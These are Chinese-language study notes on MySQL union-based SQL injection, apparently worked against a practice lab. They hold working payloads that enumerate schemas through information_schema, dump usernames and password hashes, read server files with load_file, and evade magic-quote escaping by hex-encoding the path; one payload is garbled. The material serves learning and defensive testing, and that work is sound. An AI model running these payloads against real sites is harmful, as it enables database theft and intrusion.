SQL的一般流程步骤

  1. MySQL注入普通流程

    1. 必要知识点：在MySQL5.0以上版本中，MySQL存在一个自带数据库名为information_schema，它是一个存储记录所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或列名信息。
    2. 数据库中符号“.”表示下一级，如shj1395.wenwen表示shj1395数据库下wenwen表名

    ​ information_schema.tables; –记录所有表名信息的表

    ​ information_schema.columns; –记录所有列名信息的表

    ​ table_name; 表名

    ​ column_name; 列名

    ​ table_shcema; 数据库名

    • 收集信息

      1. 数据库版本 version() –5.5.44-0ubuntu0.14.04.1

      2. 数据库名字database() –security

      3. 数据库用户user() --root@localhost

      4. 操作系统@@version_compile_os –debian-linux-gnu

    • 判断是否存在注入点–输入id=1qqq查询报错，存在注入漏洞

    • 判断列数–id=1 order by 4 报错说明存在3列

    • 联合注入探测注入点（回显位置）发现回显位置在2和3（需要让前面的id查询不到从而执行后面的语句）

    • 利用union联合查询指定数据库名下面的表名信息（group_concat()数据以组的形式显示出来）

      id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'

    • 查询指定数据库名、表名，下面的列名信息

      id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' and table_schema='security'

    • 查询用户名和密码

      id=-1 union select 1,group_concat(usernamegroup_concat(password) from security.users

DAY13补充

  1. 跨库查询的知识点

    • ​ MySQL数据库（MySQL -u root -p）
    • 数据库1==网站a=数据库用户a
    • 数据库2==网站b=数据库用户
    • 数据库3==网站c—

    ​ information_schema 表特性，记录库名，表名，列名对应表

    ​ Information_schema.tables:记录所有表名信息的表

    ​ Information_schema.columns：记录所有列名信息的表

    ​ schemata：记录所有数据库名的表 –列名为schema_name

    ​ table_schema:数据库名

    ​ Table_name:表名

    ​ Column_name:列名

  2. 利用information_schema.schemata查询所有数据库

    id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata

  3. 查询指定MySQL数据库下的所有表

    id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='mysql'

  4. 查询指定表users下面的所有列

    id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='user' and table_schema='mysql'

  5. 查询数据

    id=-1 union select 1,group_concat(user),group_concat(password) from mysql.user

    • load_file():读取函数

    • into outfile或 into dumpfile :导出函数

    • MYSQL新特性secure_file_priv对读写文件的影响
      此开关默认为NULL，即不允许导入导出。

      解决问题:
      windows下：

      修改my.ini 在[mysqld]内加入secure_file_priv=

      linux下：

      修改my.cnf 在[mysqld]内加入secure_file_priv=
      MYSQL新特性secure_file_priv对读写文件的影响
      然后重启mysql，再查询secure_file_priv

  6. load_file(‘’)读取函数的应用

union select 1,load_file('D:\\phpStudy\\WWW\\sqli\\sql-connections\\db-creds.inc')

这里文件路径需要拿引号 ’ 括起来，“\\”的作用是为了防止转义，是计算机知道这个确实是斜杠而已。

路径获取的常见方法

  • 报错显示：网站在出现错误的时候会显示网站路径
  • 遗留文件：类似于phpinfo文件，SCRIPT_FILENAME—脚本文件地址
  • 漏洞报错：查找网站对应组件的漏洞找寻有效的信息，word press zblog等博客搭建平台的漏洞等等
  • 平台配置文件（存放位置不绝对导致实用）：搭建平台配置文件（一般都有默认的路径）记录有网站的配置信息

魔术引号及常见防护 （magic_quotes_gpc =）

magic_quotes_gpc = 函数

当magic_quotes_gpc = On时，输入数据中含单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）等字符，都会被加上反斜线。这些转义是必须的。
php中的magic_quotes_gpc是配置在php.ini中的

打开了魔术引号在执行

id=-1%20union%20select%201,load_file(%27D:\\phpStudy\\WWW\\sqli\\sql-connections\\db-creds.inc%27),3

发现语句变成了

id=-1 union select 1,load_file(\'D:\\\\phpStudy\\\\WWW\\\\sqli\\\\sql-connections\\\\db-creds.inc\'),3

可以发现，输入数据中含单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）等字符，都会被加上反斜线。如图。

绕过办法—使用编码把包含函数过滤的字符进行编码达到目

把路径进行编码（编码的时候单引号可以省略了）D:\phpStudy\WWW\sqli\sql-connections\db-creds.inc

0x443A5C5C70687053747564795C5C5757575C5C73716C695C5C73716C2D636F6E6E656374696F6E735C5C64622D63726564732E696E63

这里可以看到注入成功了
